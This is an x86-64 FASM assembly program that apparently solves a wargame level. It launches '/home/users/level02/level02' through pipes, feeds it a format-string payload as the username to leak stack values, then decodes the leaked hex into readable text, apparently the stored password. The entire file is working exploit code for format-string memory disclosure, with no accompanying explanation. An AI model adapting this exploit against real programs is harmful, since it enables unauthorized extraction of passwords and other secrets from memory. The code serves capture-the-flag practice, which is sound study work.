
format ELF64 executable $03
entry _start

struc string data*& {
    .: db data
    .length = ($ - .)
}

segment executable readable
_start:
    and rsp, not $0F
    cld
    mov rbp, rsp
    sub rsp, $50 + $10
    mov rax, $16
    mov rdi, rsp
    syscall
    test rax, rax
    jnz .exit
    mov rax, $16
    lea rdi, qword [rsp+$08]
    syscall
    test rax, rax
    jnz .exit
    mov rax, $20
    mov rdi, $01
    syscall
    mov r12, rax
    mov rax, $21
    mov edi, dword [rsp]
    xor rsi, rsi
    syscall
    mov rax, $21
    mov edi, dword [rsp+$0C]
    mov rsi, $01
    syscall
    mov rax, $39
    syscall
    test rax, rax
    jz .child
    mov rax, $01
    mov edi, dword [rsp+$04]
    mov rsi, _username
    mov rdx, _username.length
    syscall
    mov rax, $01
    mov edi, dword [rsp+$04]
    mov rsi, _password
    mov rdx, _password.length
    syscall
    mov rax, $03
    mov edi, dword [rsp+$04]
    syscall
    xor rbx, rbx
    sub rsp, $0100
    mov r13, rsp
.read:
    xor rax, rax
    mov edi, dword [rbp-$58]
    lea rsi, qword [rbp-$50]
    mov rdx, $50
    syscall
    test eax, eax
    jz .exit
    lea rdi, qword [rbp-$50]
    mov rcx, $50
    test rbx, rbx
    jnz .skip
    mov al, '<'
    repnz scasb
    jnz .read
    mov bl, $01
.skip:
    mov rsi, rdi
    mov rdx, rcx
    mov al, '>'
    repnz scasb
    setz r9b
    movzx rax, r9b
    sub rdx, rcx
    mov rcx, rdx
    sub rcx, rax
    mov rdi, r13
    rep movsb
    mov r13, rdi
    test r9b, r9b
    jz .read
.convert:
    mov rcx, r13
    sub rcx, rsp
    shr rcx, $01
    jrcxz .exit
    mov rdx, rcx
    mov rsi, rsp
    xor bl, bl
.reload:
    lodsb
    cmp al, $61
    jae .lower
    cmp al, $41
    jae .upper
    sub al, $30
    jmp .next
.lower:
    sub al, $61
    jmp .adjust
.upper:
    sub al, $41
.adjust:
    add al, $0A
.next:
    test bl, bl
    jnz .toAscii
    mov ah, al
    not bl
    jmp .reload
.toAscii:
    xor bl, bl
    shl ah, $04
    add al, ah
    dec rsp
    mov byte [rsp], al
    loop .reload
    mov rax, $01
    mov rdi, r12
    mov rsi, rsp
    syscall
    jmp .exit
.child:
    mov rax, $3B
    mov rdi, _program
    xor rdx, rdx
    push rdx rdi
    mov rsi, rsp
    syscall
.exit:
    mov rax, $3C
    xor rdi, rdi
    syscall

segment readable
_username string "<%26$016lx%25$016lx%24$016lx%23$016lx%22$016lx>", $0A
_password string $0A
_program: db "/home/users/level02/level02", $00

